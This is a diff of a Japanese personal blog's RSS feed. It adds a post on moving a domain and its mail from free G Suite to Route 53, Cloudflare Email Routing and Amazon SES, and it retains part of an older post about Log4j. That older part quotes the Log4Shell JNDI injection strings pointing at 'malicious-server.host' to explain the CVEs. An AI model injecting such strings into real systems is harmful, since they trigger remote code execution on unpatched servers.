@@ -1,4 +1,44 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[On Blahfe]]></title><description><![CDATA[Emacsianでアート好き、ランニング好きなnabinnoが書いているブログです]]></description><link>https://nabinno.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Sat, 01 Jan 2022 11:35:27 GMT</lastBuildDate><item><title><![CDATA[Trend Micro Vision Oneを試してみる]]></title><description><![CDATA[11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されており、これを気にZTAの文脈でセキュリティ製品を見ていこうと思います。今回はちょうど無償提供されているTrend Micro Vision Oneを軽く触ってみようと思います。   > PROBLEMPROBLEM 
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[On Blahfe]]></title><description><![CDATA[Emacsianでアート好き、ランニング好きなnabinnoが書いているブログです]]></description><link>https://nabinno.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Tue, 12 Apr 2022 15:34:45 GMT</lastBuildDate><item><title><![CDATA[G Suite無償版停止に伴い、MXレコード等のドメイン管理を整理した]]></title><description><![CDATA[今回は10年以上利用していたG Suite無償版が2022年8月に停止されるとのことで、メールアドレスの管理をどうするか検討しました。メール管理は別のGMailアカウントを使っていたので、転送できれば良いのですが、これを機にドメイン管理をAWSにまとめていくことを思いつきました。   > PROBLEMPROBLEM 
+
+- 10年以上利用していたG Suite無償版が2022年8月に停止され、メールアドレスの管理をどうしようか Google Workspaceにアップグレードしても良いけどBusiness Starterプランにしても面白みがないので別の方法を探したい G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう 
+- Google Workspaceにアップグレードしても良いけどBusiness Starterプランにしても面白みがないので別の方法を探したい G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう 
+- G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう  > SOLUTIONSOLUTION 
+
+と言うわけで、今回はG Suiteアカウントの利用を止めて、MXレコード周りを整理することにしました。個人利用なのでドメイン管理は既存のままで良かったのですが、証跡管理のない状況に耐えられずAWSに移管。メール転送機能はPOBOX以外はサブアドレス対応していなかったのですが、キャッチオール対応できるのでまずは良しとしています。現時点での構成は下記の通り。 
+
+なお、複数人数で必要になった場合は、サブアドレスとグループアドレスが対応可能なAmazon Workmailに移管する予定ですが、これでもGoogle Workspaceを利用するよりコストは半分程で済みます。  > 構成構成  > beforebefore 
+
+- ドメイン管理 バリュードメイン
+- MXレコード G Suite
+- SMTP G Suite  > afterafter 
+
+- ドメイン管理 Amazon Route 53
+- MXレコード Cloudflare Email Routing
+- SMTP Amazon SES  > 手順手順 
+
+方針が決まるまでいくつかメールサービスを検討したのですが、決まってしまえばやることは単純です。  > 1. ドメイン管理を整理する1. ドメイン管理を整理する 
+
+基本はドメイン移管申請ですが、G Suiteを後ほど削除することを考慮してMXレコードをCloudflare Email Routingに変更。本来はこの処理の前にG Suiteに紐付いている各サービスの設定変更が必要になります。 
+
+1. 移管元にてWHOIS情報公開代行の解除
+2. 移管元にてドメインロックの解除
+3. 移管元にて認証鍵 (Auth-Code) を確認
+4. 移管先にてホストゾーンの作成、各レコードの内容を移管元に合わせる
+5. Cloudflare Email Routingにて転送先メールアドレスを検証する
+6. 移管先にてMXレコードをCloudflare Email Routingのものを設定する
+7. 移管元のNSレコードを移管先に変更
+8. 移管先にて認証鍵をつかい移管申請を行う
+9. 移管元に対して移管申請を行った旨をメールにて連携する 
+
+- ドメインの他社への移管 | バリュードメイン ユーザーガイド
+- ドメイン登録の Amazon Route 53 への移管 - Amazon Route 53
+- Easily creating and routing email addresses with Cloudflare Email Routing  > 2. SMTPを設定する2. SMTPを設定する 
+
+最近はセキュリティ対策のためGMailのSMTPが使いづらくなっているので、今回はAmazon SESを利用しました。サンドボックス解除のため下記の通りサポートに依頼しました。 txt
+
+# メールタイプ 通例の取引がメインとなる予定です # ユースケース ## メールを送信する頻度 週に1-2回 ## 受信者リストのメンテナンス方法 四半期に一度の棚卸し ## バウンス対応 当該メールアドレスの削除 ## 申し立て対応 当該メールアドレスへのフラグ管理 ## 解除申請の管理方法 メールでの受付 ## 送信予定のメールサンプル {{宛先名}}様 お世話になっております。 表題の件につきまして1点問い合わせします。 {{問い合わせ内容}} ご不明な点等ございましたらお気軽にお問い合わせ下さい。 どうぞ、よろしくお願い致します。   > WRAPUPWRAPUP 
+
+以前からドメイン管理をAWSに移管したかったのですが、積極的な理由がないためなおざりになっていました。今回のG Suite無償版の期限切れに伴い整理できすっきりしたので、これを機にいろいろ整理していきたいですね。]]></description><link>https://nabinno.github.io/posts/137</link><guid isPermaLink="false">137</guid><pubDate>Tue, 12 Apr 2022 00:00:00 GMT</pubDate></item><item><title><![CDATA[Trend Micro Vision Oneを試してみる]]></title><description><![CDATA[11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されており、これを気にZTAの文脈でセキュリティ製品を見ていこうと思います。今回はちょうど無償提供されているTrend Micro Vision Oneを軽く触ってみようと思います。   > PROBLEMPROBLEM 
 
 - 11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されている JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-44228） JNDIクエリ「${jndi:ldap://127.0.0.1#malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-45046） 
 - JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-44228）
